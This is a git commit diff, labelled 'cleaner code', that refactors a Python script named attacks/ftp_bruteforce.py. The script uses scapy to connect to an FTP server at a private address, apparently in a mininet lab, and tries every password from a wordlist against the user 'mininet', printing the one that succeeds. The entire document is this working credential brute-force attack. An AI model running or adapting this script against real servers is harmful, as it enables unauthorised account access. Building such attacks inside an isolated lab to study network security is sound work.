aeb278f1fd6fa2d7a878a5202eafa3c967b251c8
Dark Peace <74102789+Dark-Peace@users.noreply.github.com>
2024-04-11 12:19:43 +0200

    cleaner code

--- attacks/ftp_bruteforce.py
+++ attacks/ftp_bruteforce.py
@@ -7,22 +7,19 @@ def get_passwords():
     with open("passwords.txt", encoding="utf8") as file:
 	    return file.readlines()
 
-def command_result(command):
-    connexion = scapy.TCP_client.tcplink(scapy.Raw, "10.12.0.40", 21)
-    code = connexion.recv()
+def command_result(connexion, command, expected):
+    connexion.send(command)
+    return expected in str(connexion.recv())
 
 def attack():
     for password in get_passwords():
         connexion = scapy.TCP_client.tcplink(scapy.Raw, "10.12.0.40", 21)
         code = connexion.recv()
         print(str(code))
+
         if "220" in str(code) or "530" in str(code):
-            connexion.send("USER mininet\r\n")
-            code = connexion.recv()
-            if "331" in str(code):
-                connexion.send("PASS {}\r\n".format(password).encode())
-                code = connexion.recv()
-                if "230" in str(code):
+            if command_result(connexion, "USER mininet\r\n", "331"):
+                if command_result(connexion, "PASS {}\r\n".format(password).encode(), "230"):
                     print("success with password: ", password)
                     connexion.close()
                     return
